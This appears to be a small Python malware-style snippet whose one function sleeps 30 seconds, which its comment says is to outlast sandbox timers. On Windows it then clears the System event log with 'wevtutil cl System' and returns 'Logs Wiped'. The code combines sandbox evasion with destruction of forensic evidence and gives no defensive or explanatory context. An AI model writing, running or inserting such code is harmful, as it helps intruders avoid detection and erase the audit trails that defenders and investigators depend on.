import os, time

def run():
    # Delay execution to wait out sandbox timers
    time.sleep(30)
    # Self-deleting logs
    if os.name == 'nt': os.system("wevtutil cl System")
    return "Logs Wiped"